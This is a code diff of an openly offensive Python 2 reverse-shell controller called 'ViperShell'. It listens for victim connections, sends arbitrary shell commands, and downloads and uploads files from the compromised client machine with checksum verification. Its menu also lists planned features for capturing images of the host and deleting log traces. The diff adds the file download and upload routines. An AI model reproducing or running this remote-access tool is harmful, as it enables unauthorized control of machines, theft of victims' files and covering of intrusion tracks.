@@ -1,11 +1,14 @@
 #!/usr/bin/python
-from twisted.internet.protocol import Factory
-from twisted.internet import protocol, reactor
-from twisted.python import log
-
+#from twisted.internet.protocol import Factory
+#from twisted.internet import protocol, reactor
+#from twisted.python import log
 import socket
 import os
 import time
+import threading
+import subprocess
+import hashlib
+import random
 
 
 """This is python reverse shell that grabs files or information and reports back to the server!"""
@@ -28,42 +31,65 @@ def menu():
     """This is the program menu"""
     print "[*] Command options: "
     print
-    print "[*] grab*<filename> ========= > grabs the file and saves it to the local desktop as .txt" #DONE
-    print "[*] getenv       ========= >  prints the system information" #Works
-    print "[*] getuid       ========= > Get the user level access of the shell" #works
+    print "[*] download ========= > downloads a file from the client machine (ex: download #source #dest)" #DONE
+    print "[*] upload   ========= > uploads a file to the client machine (ex: upload #source #dest)"
+    print "[*] getenv   ========= >  prints the system information" #Works
+    print "[*] getuid   ========= > Get the user level access of the shell" #works
     print "[*] SystemInfo   ========= > Get Fingerprint of the system" #TODO
     print "[*] capture      ========= > take images of the host machine " #Working on this
     print "[*] Cover        ========= > Delete all traces of logs" #TODO
     print "\n"
 
-def transfer(conn,command):
+
+
+def download(conn,command):
+
+    x,src,dst=map(str,command.split(' '))
     conn.send(command)
-    f = open('/root/Desktop/test.py','wb')
-    while True:
-        bits = conn.recv(1024)
+    f = open(dst,'wb') 
+    bits = conn.recv(1024)
+    while bits!='': 
         if 'Unable to find out the file' in bits:
             print '[-] Unable to find out the file'
             break
+        if not bits.endswith('DONE'):
+            f.write(bits)
+        
         if bits.endswith('DONE'):
-            print '[+] Transfer completed '
+            bits=bits.replace('DONE','')
+            f.write(bits)
             f.close()
             break
-        f.write(bits)
-    f.close()
+        bits=conn.recv(1024)
 
-def send(s, path, command):
-    if os.path.exists(path):
-        f = open(path, 'rb')
-        packet = f.read(1024)
-        while packet != '':
-            s.send(packet)
-            packet = f.read(1024)
-        s.send('DONE')
-        print('[+] File Sent!')
-        f.close()
-    else:
-        print('File does not exist')
+    md5_sv=hashlib.md5(open(dst,'rb').read()).hexdigest()   
+    conn.send(md5_sv)
+    if conn.recv(1024)=='md5 OK':
+        print '[+] MD5 Checksum Verified, File Downloaded Succesfully !'
+    else :
+        print '[-] MD5 Checksum Not Verified, File not Downloaded Succesfully'
+    
 
+def upload(conn,command):
+
+
+	x,src,dst=map(str,command.split(' '))
+	conn.send(command)
+	file_to_send=open(src,'rb')
+	packet=file_to_send.read(1024)
+	while packet!='':
+		conn.send(packet) 
+		packet = file_to_send.read(1024)
+        conn.send('DONE')
+        file_to_send.close()
+
+	#md5_sv=hashlib.md5(open(src,'rb').read()).hexdigest()
+	#conn.send(md5_sv)
+	#print md5_sv
+	#if conn.recv(1024)=='md5 OK':
+        #    print '[+] MD5 Checksum Verified, File Uploaded Succesfully !'
+	#else :
+        #    print '[-] MD5 Checksum not Verified !'
 
 
 def connect():
@@ -76,6 +102,7 @@ def connect():
                 s.bind((ip, port))
                 print "[+] ip", ip, "is open"
                 print "[+] port", port, "is open"
+
             except socket.error:
                 time.sleep( 3.0)
                 print "[+] ip", ip, "is closed"
@@ -83,7 +110,7 @@ def connect():
                 print 'Socket connect failed! Loop up and try socket again'
                 connect()
     
-            s.listen(1)
+            s.listen(100)
             print '[+] listening for incoming TCP connection on ip address %s and port number %d' % ('ip', port)
             conn, addr = s.accept()
             print '[+] We got a connection from: ',addr
@@ -93,29 +120,26 @@ def connect():
         while True:
             command = raw_input("$ ViperShell>> ")
 
+
             if 'terminate' in command:
                 conn.send('terminate')
                 conn.close() #close the connection with host
                 break
-            elif 'grab' in command:
-                transfer(conn,command)  #usage shell > grab*file
 
-            elif 'send' in command:
-                conn.send(command)
-                sendW,path = command.split('*')
-                try:
-                    send(conn, path, command)
-                except Exception,e:
-                    s.send (str(e))
-                    pass
+            elif 'download' in command:
+                download(conn,command)
+
+            elif 'upload' in command:
+                upload(conn,command)
+
             else:
                 conn.send(command) #send command
-                print conn.recv(1024)
+                print conn.recv(2048)
 
     except KeyboardInterrupt:
         print 'interrupted!'
         print 'returning to main program'
-        os.system('python ../../viper.py')      
+        os.system('python viperserver.py')      
 
 def main():
     banner()
